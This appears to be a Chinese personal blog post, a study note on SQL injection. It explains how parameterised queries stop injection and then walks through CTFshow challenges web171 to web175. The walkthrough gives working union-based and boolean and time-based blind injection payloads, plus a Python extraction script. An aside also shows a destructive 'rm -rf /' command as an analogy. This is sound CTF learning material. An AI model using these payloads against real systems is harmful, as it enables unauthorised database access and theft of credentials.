---
title: 浅谈 SQL 注入
date: 2025-03-29 09:00:00
tags: [CTF, Web, 渗透]
categories: 学习
---

一边瞎扯一边学习，也是很爽的。
<!--more-->

## 前言

我很早就接触过 MySQL，高考完暑假的时候就用 PHP 和 MySQL 搞了个简单的成绩查询系统，当时还不知道有 SQL 注入这个东西，回想起来要是漏给一个会 SQL 注入的人，估计就被打烂了。

但是为什么一直没怎么学 SQL 注入呢？—— 因为后来听说参数化查询基本可以完全防住 SQL 注入了，就感觉学这个没什么意义了。

现在转念一想，咱又不是搞前沿的，用这个打打老系统绰绰有余（关键是面试官真的会问），那就学一下咯。

小 Review: 发现之前写的 BUUOJ 有几题 SQL 注入的题目，挖了坑没补过程，准备学完补上。

## 参数化查询是如何防御 SQL 注入的

可以看下知乎的[这个回答](https://www.zhihu.com/question/52869762)，大概意思如下：

有一个 SQL 语句：

```sql
select count(1) from students where name='张三'
```

注入语句：

```sql
select count(1) from students where name='张三' or 1=1
```

那么 `name` 参数的值 `张三' or 1=1` 就会被当成 SQL 语句的一部分，整个一块编译，导致 SQL 注入。

这时候预编译来了，以下是一个 Java 的实现：

```java
import java.sql.PreparedStatement;

String sql = "select * from user where username=? and passwd=?";
ps = conn.PreparedStatement(sql);
ps.setString(1, "admin");
ps.setString(2, "123456");
resultSet = ps.executeQuery();
```

可以看到，`conn.PreparedStatement()` 函数直接把 SQL 语句编译好了，后面只是传参 + 执行。
可能读者咋一眼看上去会觉得没什么区别，我拿大家都熟悉的场景来举个例子：
相信大家都是接触过 C 语言的，没有预编译的 SQL 就相当于你可以操作 `*.c` 文件给编译器编译并执行，可以把 `int a=?;` 填成 `int a=1; system("rm -rf /");`，而预编译的 SQL 就相当于编译了一段 `int a=0;scanf("%d", &a);`，现在程序只负责接收参数并执行，根本无法编译恶意代码。

## CTFshow 刷题记录

### web171 - web175

给 Xenny 充点钱，在 [NSS](https://www.nssctf.cn/problem/sheet/10708) 上吸收了一下知识，读者如果像我一样也是个小白也可以去支持一下，十来块钱不算贵。
以 CTFshow 的 web171 为例，查询语句题目直接给出（不会有人不知道 PHP 能用 `.` 拼接字符串吧）

```php
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

那我们直接 `'--+` 闭合即可。（`--` 是注释符号，`+` 是干嘛的我也不清楚，加就是了，`#` 也是注释符号，可以根据情况来），引号闭合的意义就是补全前面代码，使得前面部分加上这个引号是一个正常的语句，注释的意义是无视后面的代码，那么这时中间就可以写我们的 SQL 语句了。

```sql
' order by 3--+
```

换成 4 就报错，说明列数为 3
那么采用联注，语句如下：

```sql
' union select database(),version(),user()--+
```

结果分别为 `ctfshow_web`, `10.3.18-MariaDB`, `root@localhost`
查表：

```sql
' union select 1,2,table_name from information_schema.tables where table_schema='ctfshow_web'--+
```

结果为 `ctfshow_user`
再查列：

```sql
' union select 1,2,column_name from information_schema.columns where table_name='ctfshow_user'--+
```

结果为分别为 `id`, `username`, `password`
最后直接套出整个表，当然根据题意加个 `where username = 'flag'` 也行：

```sql
' union select id,username,password from ctfshow_user--+
```

web172 也是类似，虽然加了个如下拦截，但是我们不出现 `username` 字段即可

```php
//检查结果是否有flag
    if($row->username!=='flag'){
      $ret['msg']='查询成功';
    }
```

还是仿照上面一套打下来，最终 payload 如下：

```sql
' union select id,password from ctfshow_user2 where username='flag'--+
```

web173 的拦截比较有意思，直接正则匹配结果了，考虑能不能用 `substr()` 之类的函数截取字符串

```php
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

发现他的 flag 头是 `ctfshow{`，根本不用管，绷，payload 如下：

```sql
' union select id,1,password from ctfshow_user3--+
```

web174 有点刁难了，把数字也拦截了

```php
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

考虑布尔盲注，payload 如下：

```sql
1' and 1=1--+
```

发现此时有返回结果而改为 `1=0` 时返回的结果为空，说明布尔盲注可行，脚本如下：

```python
import requests as r
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


value = ''
i = 1

while True:
    low, high = 0, 127
    char_ascii = 0
    
    while low <= high:
        mid = (low + high) // 2
        # payload = f"1' and 1=if(ascii(substr((database()), {i}, 1)) > {mid}, 1, 0)--+"
        payload = f"1' and 1=if(ascii(substr((select group_concat(password) from ctfshow_user4 where username='flag'), {i}, 1)) > {mid}, 1, 0)--+"
        payload = payload.replace(' ', '%20')
        payload = payload.replace("'", "%27")
        # print(payload)
        result = r.get(f'https://777fe6df-5d10-4f76-81f6-91f860d5de1e.challenge.ctf.show/api/v4.php?id={payload}&Page=1&limit=10', verify=False)

        oracle = len(result.json()['data']) > 0
        
        if oracle:  # 条件成立，ASCII值大于mid
            low = mid + 1
        else:
            high = mid - 1
    
    if high < 0:  # 字符位置不存在时退出
        break
    
    char_ascii = high + 1
    if char_ascii == 0:
        break
    
    value += chr(char_ascii)
    print(f"Current: {value}")
    i += 1

print(f"Final value: {value}")
```

注意到 python 用 https 时需要加上 `verify=False`，否则会报错，还要加上 `urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)` 来禁止警告。
Python 的 `requests` 还有个坑就是会把 params 猛猛地 urlencode 一遍，导致最终的 url 面目全非，从而导致 payload 不生效。

web175 拦截更离谱了，直接啥都拦了

```php
//检查结果是否有flag
    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

我倒是想知道生产环境会不会有这么拦的

那从解题的角度来说那只能时间盲注了，payload 如下：

```sql
1' and 1=if(ascii(substr((select group_concat(password) from ctfshow_user5 where username='flag'), {i}, 1)) > {mid}, sleep(1), 0)--+
```

oracle 改为 `result.elapsed.total_seconds() > 1` 即可。
// To be continued...

## 参考

<https://www.zhihu.com/question/52869762>
<https://www.freebuf.com/articles/web/339118.html>
